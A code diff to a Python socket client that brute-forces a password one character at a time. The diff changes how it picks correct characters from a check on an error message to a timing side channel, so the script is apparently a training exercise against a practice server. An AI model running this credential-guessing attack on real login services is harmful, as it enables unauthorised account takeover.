@@ -2,6 +2,7 @@ import socket
 import argparse
 import itertools
 import json
+import time
 
 
 def return_login_in_list():
@@ -64,17 +65,20 @@ def send_login_and_password():
         password_alpha = next(letter_generator)
         password_to_send = found_password + password_alpha
         data_to_send = {"login": login, "password": password_to_send}
+        start = time.time()
         client_socket.send(json.dumps(data_to_send).encode())
         response = json.loads(client_socket.recv(1024).decode())
+        finish = time.time()
+        lead_time = finish - start
         result = response['result']
-        if result == 'Exception happened during login':
+        if lead_time > 0.1:
             found_password += password_alpha
             letter_generator = return_alpha()
         elif result == 'Connection success!':
             found_password += password_alpha
             print(json.dumps({"login": login, "password": found_password}))
             break
-#
+
 
 parser = argparse.ArgumentParser()
 parser.add_argument('IP_address')
